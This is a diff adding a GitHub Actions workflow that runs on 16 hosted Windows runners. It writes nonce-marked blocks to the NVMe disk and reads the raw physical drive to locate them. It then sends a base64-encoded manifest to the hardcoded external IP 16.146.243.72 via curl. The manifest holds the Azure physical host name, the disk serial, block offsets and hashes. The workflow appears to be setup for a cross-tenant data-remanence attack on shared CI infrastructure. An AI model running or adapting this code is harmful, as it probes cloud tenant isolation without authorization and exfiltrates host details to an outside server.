@@ -1,0 +1,67 @@
+name: Public-A bounded NVMe remanence seeder
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  seed:
+    strategy:
+      fail-fast: false
+      max-parallel: 16
+      matrix:
+        sample: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+    runs-on: windows-latest
+    timeout-minutes: 8
+    steps:
+      - name: Seed and raw-verify bounded nonce blocks
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $hostName = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters').PhysicalHostNameFullyQualified
+          $disk = Get-Disk | Where-Object FriendlyName -like '*NVMe Direct*' | Select-Object -First 1
+          if (-not $disk) { exit 0 }
+          $serial = ($disk.SerialNumber -replace '[^0-9A-Fa-f_]', '').Trim('_')
+          $partition = Get-Partition -DiskNumber $disk.Number | Where-Object DriveLetter | Select-Object -First 1
+          $ntfs = fsutil fsinfo ntfsinfo "$($partition.DriveLetter):" | Out-String
+          $clusterSize = [int]([regex]::Match(($ntfs -split "`n" | Select-String 'Bytes Per Cluster').ToString(), ':\s*(\d+)').Groups[1].Value)
+          $directory = "$($partition.DriveLetter):\myth-rem"
+          New-Item -ItemType Directory -Force -Path $directory | Out-Null
+          $file = "$directory\marker.bin"
+          $nonce = [Guid]::NewGuid().ToString('N')
+          $sha = [System.Security.Cryptography.SHA256]::Create()
+          $payload = New-Object byte[] (32 * 4096)
+          $hashes = @()
+          for ($block = 0; $block -lt 32; $block++) {
+            $seed = [Text.Encoding]::ASCII.GetBytes("MYTHREMWA|$nonce|$block")
+            $buf = New-Object byte[] 4096
+            $h = $sha.ComputeHash($seed)
+            for ($offset = 0; $offset -lt 4096; $offset += 32) {
+              [Array]::Copy($h, 0, $buf, $offset, 32)
+              $h = $sha.ComputeHash($h)
+            }
+            [Array]::Copy($buf, 0, $payload, $block * 4096, 4096)
+            $hashes += ([BitConverter]::ToString($sha.ComputeHash($buf)) -replace '-', '').ToLower()
+          }
+          $stream = [System.IO.File]::Open($file, 'Create', 'ReadWrite', 'None')
+          $stream.Write($payload, 0, $payload.Length); $stream.Flush($true); $stream.Close()
+          $extent = ((fsutil file queryExtents $file | Out-String) -split "`n" | Select-String 'VCN').ToString()
+          $lcnHex = ($extent -split 'LCN:')[1].Trim() -split '\s' | Select-Object -First 1
+          $lcn = [Convert]::ToInt64(($lcnHex -replace '^0x',''), 16)
+          $base = $partition.Offset + $lcn * $clusterSize
+          $raw = [System.IO.File]::Open("\\.\PHYSICALDRIVE$($disk.Number)", 'Open', 'Read', [System.IO.FileShare]::ReadWrite)
+          $verified = 0
+          for ($block = 0; $block -lt 4; $block++) {
+            $raw.Seek($base + $block * 4096, 'Begin') | Out-Null
+            $buf = New-Object byte[] 4096; $raw.Read($buf, 0, 4096) | Out-Null
+            $actual = ([BitConverter]::ToString($sha.ComputeHash($buf)) -replace '-', '').ToLower()
+            if ($actual -eq $hashes[$block]) { $verified++ }
+          }
+          $raw.Close()
+          $manifest = @{source='public-a'; host=$hostName; serial=$serial; disk=$disk.Number; cluster=$clusterSize; base=$base; count=32; hashes=$hashes; raw_verified=$verified; run=$env:GITHUB_RUN_ID; sample='${{ matrix.sample }}'}
+          if ($verified -eq 4) {
+            $result = $manifest | ConvertTo-Json -Compress
+            $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($result)).Replace('+','-').Replace('/','_')
+            curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_SEED?d=$encoded" | Out-Null
+          }
